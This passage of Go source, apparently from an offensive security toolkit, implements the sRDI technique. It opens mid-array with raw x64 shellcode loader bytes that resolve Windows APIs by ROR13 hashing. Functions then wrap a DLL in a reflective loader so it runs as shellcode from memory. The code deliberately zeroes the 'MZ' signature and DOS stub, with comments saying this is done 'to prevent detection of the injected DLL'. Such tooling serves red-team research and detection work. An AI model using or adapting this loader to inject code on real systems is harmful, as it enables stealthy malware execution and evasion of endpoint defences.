	0x03, 0xC4, 0x41, 0x8A, 0x00, 0x84, 0xC0, 0x75, 0xEC, 0x41, 0x3B, 0xF2, 0x75, 0x05, 0x48, 0x85, 0xD2, 0x75, 0x12, 0x41, 0x03, 0xFC,
	0x49, 0x83, 0xC1, 0x04, 0x48, 0x83, 0xC2, 0x02, 0x41, 0x3B, 0xFB, 0x73, 0x22, 0xEB, 0xC3, 0x8B, 0x41, 0x1C, 0x0F, 0xB7, 0x0A, 0x48,
	0x03, 0xC3, 0x8B, 0x95, 0xC8, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x04, 0x88, 0x48, 0x8B, 0x8D, 0xC0, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xC3,
	0x41, 0xFF, 0xD0, 0x48, 0x8B, 0xC3, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x9C, 0x24, 0xB0, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x70,
	0x01, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0xC3, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58,
	0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B,
	0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x8B, 0xE9, 0x45, 0x33, 0xF6, 0x48, 0x8B, 0x50, 0x18, 0x4C, 0x8B, 0x4A, 0x10, 0x4D, 0x8B, 0x41,
	0x30, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xB3, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3C, 0x41, 0x8B, 0xD6,
	0x4D, 0x8B, 0x09, 0xF3, 0x0F, 0x7F, 0x04, 0x24, 0x46, 0x8B, 0x9C, 0x00, 0x88, 0x00, 0x00, 0x00, 0x45, 0x85, 0xDB, 0x74, 0xD2, 0x48,
	0x8B, 0x04, 0x24, 0x48, 0xC1, 0xE8, 0x10, 0x66, 0x44, 0x3B, 0xF0, 0x73, 0x22, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x44, 0x0F, 0xB7, 0xD0,
	0x0F, 0xBE, 0x01, 0xC1, 0xCA, 0x0D, 0x80, 0x39, 0x61, 0x7C, 0x03, 0x83, 0xC2, 0xE0, 0x03, 0xD0, 0x48, 0xFF, 0xC1, 0x49, 0x83, 0xEA,
	0x01, 0x75, 0xE7, 0x4F, 0x8D, 0x14, 0x18, 0x45, 0x8B, 0xDE, 0x41, 0x8B, 0x7A, 0x20, 0x49, 0x03, 0xF8, 0x45, 0x39, 0x72, 0x18, 0x76,
	0x8E, 0x8B, 0x37, 0x41, 0x8B, 0xDE, 0x49, 0x03, 0xF0, 0x48, 0x8D, 0x7F, 0x04, 0x0F, 0xBE, 0x0E, 0x48, 0xFF, 0xC6, 0xC1, 0xCB, 0x0D,
	0x03, 0xD9, 0x84, 0xC9, 0x75, 0xF1, 0x8D, 0x04, 0x13, 0x3B, 0xC5, 0x74, 0x0E, 0x41, 0xFF, 0xC3, 0x45, 0x3B, 0x5A, 0x18, 0x72, 0xD5,
	0xE9, 0x5E, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x42, 0x24, 0x43, 0x8D, 0x0C, 0x1B, 0x49, 0x03, 0xC0, 0x0F, 0xB7, 0x14, 0x01, 0x41, 0x8B,
	0x4A, 0x1C, 0x49, 0x03, 0xC8, 0x8B, 0x04, 0x91, 0x49, 0x03, 0xC0, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B,
	0x6C, 0x24, 0x28, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x10, 0x41, 0x5E, 0xC3,
}

func is64(b []byte) bool {
	if len(b) <= 64 {
		return false
	}
	var (
		_ = b[64]
		o = uint32(b[60]) | uint32(b[61])<<8 | uint32(b[62])<<16 | uint32(b[63])<<24
	)
	if len(b) <= int(o+2) {
		return false
	}
	var (
		_ = b[o+6]
		m = uint16(b[o+4]) | uint16(b[o+4+1])<<8
	)
	return m == 512 || m == 34404
}
func pow(n, m uint32) uint32 {
	if m == 0 {
		return 1
	}
	for i := uint32(2); i <= m; i++ {
		n *= n
	}
	return n
}
func hashmod(s string) uint32 {
	var (
		b = []byte(s)
		h uint32
	)
	for i := range b {
		h = rot(h, 13, 32)
		h += uint32(b[i])
	}
	return rot(h, 13, 32)
}
func rot(v, r, m uint32) uint32 {
	return ((v & (pow(2, m) - 1)) >> (r % m)) | (v << (m - (r % m)) & (pow(2, m) - 1))
}

// DLLToASM will patch the DLL raw bytes and convert it into shellcode using
// the SRDi launcher.
//
//	SRDi GitHub: https://github.com/monoxgas/sRDI
//
// The first string param is the function name which can be empty if not needed.
//
// The resulting byte slice can be used in an 'Asm' struct to directly load and
// run the DLL.
func DLLToASM(f string, b []byte) []byte {
	if len(b) <= 64 || b[0] != 77 || b[1] != 90 || b[2] != 144 {
		return b
	}
	if len(f) == 0 {
		f = "A"
	}
	if is64(b) {
		return buildLoader64(hashmod(f), b)
	}
	return buildLoader32(hashmod(f), b)
}
func buildLoader32(h uint32, b []byte) []byte {
	d := make([]byte, 47+len(b)+len(loader32))
	d[0], d[5], d[6], d[7] = 0xE8, 0x58, 0x55, 0x89
	d[8], d[9], d[10], d[11] = 0xE5, 0x89, 0xC3, 0x05
	i := 41 + len(loader32)
	d[12], d[13], d[14] = byte(i), byte(i>>8), byte(i>>16)
	d[15], d[16], d[17] = byte(i>>24), 0x81, 0xC3
	i += len(b)
	d[18], d[19], d[20] = byte(i), byte(i>>8), byte(i>>16)
	d[21], d[22], d[23], d[27] = byte(i>>24), 0x68, 0x00, 0x68
	d[28], d[32], d[33] = 0x01, 0x53, 0x68
	d[34], d[35], d[36] = byte(h), byte(h>>8), byte(h>>16)
	d[37], d[38], d[39], d[40] = byte(h>>24), 0x50, 0xE8, 0x02
	d[44], d[45] = 0xC9, 0xC3
	n := 46 + copy(d[46:], loader32[:])
	d[n+copy(d[n:], b)] = 0x41
	// Zero out 'MZ' sig to prevent detection of the injected DLL.
	d[n], d[n+1] = 0, 0
	for x := n + 0x4E; x < n+0x74; x++ {
		d[x] = 0
	}
	return d
}
func buildLoader64(h uint32, b []byte) []byte {
	d := make([]byte, 65+len(b)+len(loader64))
	d[0], d[5], d[6], d[7] = 0xE8, 0x59, 0x49, 0x89
	d[8], d[9], d[10], d[11] = 0xC8, 0x48, 0x81, 0xC1
	i := 59 + len(loader64)
	d[12], d[13], d[14] = byte(i), byte(i>>8), byte(i>>16)
	d[15], d[16], d[17] = byte(i>>24), 0xBA, byte(h)
	d[18], d[19], d[20] = byte(h>>8), byte(h>>16), byte(h>>24)
	d[21], d[22], d[23] = 0x49, 0x81, 0xC0
	i += len(b)
	d[24], d[25], d[26] = byte(i), byte(i>>8), byte(i>>16)
	d[27], d[28], d[29] = byte(i>>24), 0x41, 0xB9
	d[30], d[34] = 0x01, 0x56
	d[35], d[36], d[37], d[38] = 0x48, 0x89, 0xE6, 0x48
	d[39], d[40], d[41], d[42] = 0x83, 0xE4, 0xF0, 0x48
	d[43], d[44], d[45], d[46] = 0x83, 0xEC, 0x30, 0xC7
	d[47], d[48], d[49], d[54] = 0x44, 0x24, 0x20, 0xE8
	d[55], d[59], d[60], d[61] = 0x05, 0x48, 0x89, 0xF4
	d[62], d[63] = 0x5E, 0xC3
	n := 64 + copy(d[64:], loader64[:])
	d[n+copy(d[n:], b)] = 0x41
	// Zero out 'MZ' sig to prevent detection of the injected DLL.
	d[n], d[n+1] = 0, 0
	for x := n + 0x4E; x < n+0x74; x++ {
		d[x] = 0
	}
	return d
}
